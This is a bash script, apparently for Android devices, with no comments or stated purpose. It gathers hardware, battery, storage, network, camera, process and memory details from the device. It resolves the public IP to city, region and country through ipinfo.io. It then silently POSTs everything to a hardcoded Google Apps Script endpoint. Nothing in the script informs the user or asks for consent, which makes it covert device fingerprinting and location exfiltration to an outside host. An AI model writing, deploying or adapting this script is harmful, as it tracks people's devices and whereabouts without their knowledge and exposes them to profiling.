#!/bin/bash
DEVICE=$(getprop ro.product.brand)
CPU=$(getprop ro.hardware)
RAM=$(grep "MemTotal" /proc/meminfo | cut -f 2 -d ':')
SDK=$(getprop ro.build.version.sdk)
BUILD_TIME=$(getprop ro.build.date)
BATTERY_STATUS=$(cat /sys/class/power_supply/battery/status 2>/dev/null || echo "Unknown")
BATTERY_CAPACITY=$(cat /sys/class/power_supply/battery/capacity 2>/dev/null || echo "Unknown")
BATTERY_CURRENT=$(cat /sys/class/power_supply/battery/current_now 2>/dev/null || echo "Unknown")
BATTERY_TYPE=$(cat /sys/class/power_supply/battery/technology 2>/dev/null || echo "Unknown")
STORAGE_TOTAL=$(df /data | awk 'NR==2 {print $2}')
STORAGE_USED=$(df /data | awk 'NR==2 {print $3}')
STORAGE_FREE=$(df /data | awk 'NR==2 {print $4}')
IP_ADDRESS=$(ifconfig wlan0 | grep inet | awk '{ print $2 }' | cut -d/ -f1 2>/dev/null || echo "Unknown")
WIFI_STATUS=$(getprop wifi.interface)
CAMERA_FRONT=$(getprop ro.camera.front)
CAMERA_BACK=$(getprop ro.camera.rear)
PROCESS_COUNT=$(ps aux | wc -l)
CPU_INFO=$(cat /proc/cpuinfo | grep "processor" | wc -l)
CPU_MODEL=$(cat /proc/cpuinfo | grep "model name" | head -n 1 | cut -d: -f2)
TOTAL_MEMORY=$(free -m | grep Mem | awk '{print $2}')
USED_MEMORY=$(free -m | grep Mem | awk '{print $3}')
FREE_MEMORY=$(free -m | grep Mem | awk '{print $4}')
BUFFER_MEMORY=$(free -m | grep Mem | awk '{print $6}')
LAST_UPDATE=$(stat -c %y /system)
INTERNET_IP=$(curl -s ifconfig.me)
LOCATION_INFO=$(curl -s "http://ipinfo.io/$INTERNET_IP" | grep -oP '"city": "\K[^"]*' || echo "Unknown Location")
REGION_INFO=$(curl -s "http://ipinfo.io/$INTERNET_IP" | grep -oP '"region": "\K[^"]*' || echo "Unknown Region")
COUNTRY_INFO=$(curl -s "http://ipinfo.io/$INTERNET_IP" | grep -oP '"country": "\K[^"]*' || echo "Unknown Country")
curl -X POST "https://script.google.com/macros/s/AKfycbwSljw2ywFLmDMkD3mXojswhWnGg0XcbcgGX1zHHbgIXivz81f_LAMttyTEmuFXxJLr0A/exec" \
    -d "deviceName=$DEVICE" \
    -d "cpu=$CPU" \
    -d "cpuModel=$CPU_MODEL" \
    -d "ram=$RAM" \
    -d "sdk=$SDK" \
    -d "buildTime=$BUILD_TIME" \
    -d "batteryStatus=$BATTERY_STATUS" \
    -d "batteryCapacity=$BATTERY_CAPACITY" \
    -d "batteryCurrent=$BATTERY_CURRENT" \
    -d "batteryType=$BATTERY_TYPE" \
    -d "storageTotal=$STORAGE_TOTAL" \
    -d "storageUsed=$STORAGE_USED" \
    -d "storageFree=$STORAGE_FREE" \
    -d "ipAddress=$IP_ADDRESS" \
    -d "wifiStatus=$WIFI_STATUS" \
    -d "frontCamera=$CAMERA_FRONT" \
    -d "backCamera=$CAMERA_BACK" \
    -d "processCount=$PROCESS_COUNT" \
    -d "cpuInfo=$CPU_INFO" \
    -d "totalMemory=$TOTAL_MEMORY" \
    -d "usedMemory=$USED_MEMORY" \
    -d "freeMemory=$FREE_MEMORY" \
    -d "bufferMemory=$BUFFER_MEMORY" \
    -d "lastUpdate=$LAST_UPDATE" \
    -d "internetIp=$INTERNET_IP" \
    -d "locationInfo=$LOCATION_INFO" \
    -d "regionInfo=$REGION_INFO" \
    -d "countryInfo=$COUNTRY_INFO"

